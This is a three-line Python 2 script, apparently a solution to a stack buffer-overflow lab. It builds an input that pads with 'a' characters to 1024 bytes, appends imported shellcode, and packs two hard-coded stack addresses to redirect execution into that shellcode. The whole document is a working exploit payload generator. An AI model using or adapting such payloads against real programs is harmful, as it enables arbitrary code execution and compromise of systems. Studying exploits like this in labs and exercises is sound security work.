import struct
from shellcode import shellcode
print 'a'*(1024 - len(shellcode)) + shellcode + struct.pack('<I', 0xfffecd50) + struct.pack('<I', 0xfffecd7c)
